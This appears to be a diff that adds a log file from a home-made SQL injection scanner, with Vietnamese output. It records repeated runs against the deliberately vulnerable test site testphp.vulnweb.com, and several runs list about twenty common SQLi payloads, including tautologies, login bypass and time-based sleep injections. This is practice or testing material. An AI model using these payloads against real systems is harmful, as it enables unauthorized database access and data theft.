@@ -1,0 +1,468 @@
+http://testphp.vulnweb.com/artists.php?artist=
+[+] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] Có thể bị SQLi với payload: '
+    URL thử: http://testphp.vulnweb.com/artists.php?artist='
+
+[!] Có thể bị SQLi với payload: " or 1=1--
+    URL thử: http://testphp.vulnweb.com/artists.php?artist=" or 1=1--
+
+[!] Có thể bị SQLi với payload: ') or ('1'='1
+    URL thử: http://testphp.vulnweb.com/artists.php?artist=') or ('1'='1
+
+
+====
+http://testphp.vulnweb.com/artists.php?artist=
+[+] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] Có thể bị SQLi với payload: '
+    URL thử: http://testphp.vulnweb.com/artists.php?artist='
+
+[!] Có thể bị SQLi với payload: " or 1=1--
+    URL thử: http://testphp.vulnweb.com/artists.php?artist=" or 1=1--
+
+[!] Có thể bị SQLi với payload: ') or ('1'='1
+    URL thử: http://testphp.vulnweb.com/artists.php?artist=') or ('1'='1
+
+
+====
+http://testphp.vulnweb.com/artists.php?artist=
+[+] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[X] Không thể đọc file: payloads/sqli_error_based.txt
+[X] Không thể đọc file: payloads/sqli_boolean_based.txt
+[X] Không thể đọc file: payloads/sqli_time_based.txt
+[✓] Không phát hiện lỗ hổng SQLi.
+
+
+====
+http://testphp.vulnweb.com/artists.php?artist=
+[+] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[✓] Không phát hiện lỗ hổng SQLi.
+
+
+====
+http://testphp.vulnweb.com/artists.php?artist=
+[+] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[!] Lỗi khi gửi request: name 'requests' is not defined
+[✓] Không phát hiện lỗ hổng SQLi.
+
+
+====
+http://testphp.vulnweb.com/artists.php?artist=
+[+] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] URL không chứa tham số để kiểm tra payload.
+[!] URL không chứa tham số để kiểm tra payload.
+[!] URL không chứa tham số để kiểm tra payload.
+[✓] Không phát hiện lỗ hổng SQLi.
+
+
+====
+http://testphp.vulnweb.com/artists.php?artist=
+[+] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] URL không chứa tham số để kiểm tra payload.
+[!] URL không chứa tham số để kiểm tra payload.
+[!] URL không chứa tham số để kiểm tra payload.
+[✓] Không phát hiện lỗ hổng SQLi.
+
+
+====
+http://testphp.vulnweb.com/artists.php?artist=
+[+] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+====
+http://testphp.vulnweb.com/artists.php?artist=
+[+] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+====
+http://testphp.vulnweb.com/artists.php?artist=
+[+] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+====
+http://testphp.vulnweb.com/artists.php?artist=
+[+] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+====
+http://testphp.vulnweb.com/artists.php?artist=
+[+] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+====
+http://testphp.vulnweb.com/artists.php?artist=
+[+] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+====
+http://testphp.vulnweb.com/artists.php?artist=
+[+] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+====
+http://testphp.vulnweb.com/artists.php?artist=
+[+] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+====
+http://testphp.vulnweb.com/artists.php?artist=
+[+] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+====
+http://testphp.vulnweb.com/artists.php?artist=
+[+] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+====
+http://testphp.vulnweb.com/artists.php?artist=
+[+] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+====
+http://testphp.vulnweb.com/artists.php?artist=
+[+] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+====
+https://vulnerable-xxe.herokuapp.com/xml
+[+] Đang kiểm tra SQL Injection trên: https://vulnerable-xxe.herokuapp.com/xml
+[!] URL không chứa tham số để kiểm tra payload.
+[!] URL không chứa tham số để kiểm tra payload.
+[!] URL không chứa tham số để kiểm tra payload.
+[✓] Không phát hiện lỗ hổng SQLi.
+
+
+====
